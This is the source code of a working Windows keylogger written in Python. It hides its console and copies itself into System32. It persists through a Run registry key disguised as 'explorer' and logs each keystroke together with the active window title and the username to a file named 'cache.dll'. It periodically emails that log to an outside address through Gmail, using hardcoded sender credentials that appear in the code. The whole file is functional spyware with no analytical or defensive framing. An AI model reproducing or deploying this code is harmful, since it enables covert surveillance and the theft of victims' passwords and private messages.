import win32console, win32gui, win32con, time, logging, os, shutil, sys, getpass
from pynput.keyboard import Listener
from datetime import datetime
from smtplib import SMTP_SSL
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading

#check file (size) -
#remove pushmail (time) ++
#make icon ++
#auto backup  +-
#mouse click events  +
#name of computer +
#speed up the algirithm

name_of_file = "cache.dll"
time_of_push = 3600.0
time_of_push_except = 1800.0
direct_path = "C:/Windows/System32/{0}".format(name_of_file)
exe_name = os.path.splitext(os.path.split(__file__)[1])[0]
path_exe = "C:\Windows\System32\{0}.exe".format(exe_name)

if "__main__" == __name__:
    win32gui.ShowWindow(win32console.GetConsoleWindow(), win32con.SW_HIDE)
    prov = True
    #size_of_file = os.stat(name_of_file).st_size
    if (os.path.isfile(path_exe)) == False:
        os.system("copy {0}.exe C:\Windows\System32".format(exe_name))
        os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v explorer /t REG_SZ /d "C:\Windows\System32\{0}.exe /f'.format(exe_name))
    w = win32gui
    s = w.GetWindowText(w.GetForegroundWindow())
    def pushmail():
        global prov
        if (os.stat(name_of_file).st_size != 0):
            filepath = name_of_file
            basename = os.path.basename(filepath)
            address = "hackbancry@gmail.com"
            password = "silvercrown1"
            addressto = "nikokusha@gmail.com"

            part = MIMEBase('application', "octet-stream")
            part.set_payload(open(filepath, "rb").read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="%s"' % basename)

            msg = MIMEMultipart()
            msg['From'] = address
            msg['To'] = addressto
            msg.attach(part)

            try:
                smtp = SMTP_SSL()
                smtp.connect('smtp.gmail.com')
                smtp.login(address, password)
                smtp.sendmail(address, addressto, msg.as_string())
                smtp.quit()
                os.remove(direct_path)
                prov = True
                if prov == True:
                    prov = False
                    t = threading.Timer(time_of_push, pushmail) # задать время при включеном инете
                    t.start()
            except:
                prov = True
                if prov == True:
                    prov = False
                    t = threading.Timer(time_of_push_except, pushmail) # задать время при отключеном инете
                    t.start()
        else:
            pass

    def save(keys):
        global s
        if (keys == "Key.enter") or (keys == "Key.space"):
            f = open(name_of_file, 'a')
            if os.stat(name_of_file).st_size == 0:
                 f.write("(%s)" % datetime.utcnow().strftime('%Y/%m/%d %H:%M:%S %f')[:-3])
            if s != w.GetWindowText(w.GetForegroundWindow()):
                s = w.GetWindowText(w.GetForegroundWindow())
                f.write("\n--------------")
                f.write(s)
                f.write("--------------\n")
            else:
                f.write("\n")
            f.write("(%s)" % datetime.utcnow().strftime('%Y/%m/%d %H:%M:%S %f')[:-3])
            f.write("(%s)" % keys)
            f.close()
        elif (keys == "Key.backspace") or (keys == "Key.ctrl_l") or (keys == "Key.shift"):
            f = open(name_of_file, 'a')
            if s != w.GetWindowText(w.GetForegroundWindow()):
                s = w.GetWindowText(w.GetForegroundWindow())
                f.write("\n--------------")
                f.write(s)
                f.write("--------------\n")
            f.write("(%s)" % keys)
            f.close()
        else:
            f = open(name_of_file, 'a')
            if os.stat(name_of_file).st_size == 0:
                nameuser = getpass.getuser()
                f.write("***************")
                f.write(nameuser)
                f.write("***************\n")
                f.write("--------------")
                f.write(s)
                f.write("--------------\n")
                f.write("(%s)" % datetime.utcnow().strftime('%Y/%m/%d %H:%M:%S %f')[:-3])
            if s != w.GetWindowText(w.GetForegroundWindow()):
                s = w.GetWindowText(w.GetForegroundWindow())
                f.write("\n--------------")
                f.write(s)
                f.write("--------------\n")
                f.write("(%s)" % datetime.utcnow().strftime('%Y/%m/%d %H:%M:%S %f')[:-3])
            f.write(keys[1:-1])
            f.close()

    def on_prees(key):
        logging.info(str(key))
        print(str(key))
        save(str(key))
        global prov
        if prov == True:
            prov = False
            t = threading.Timer(time_of_push, pushmail)
            t.start()

    with Listener(on_prees) as listener:
        listener.join()
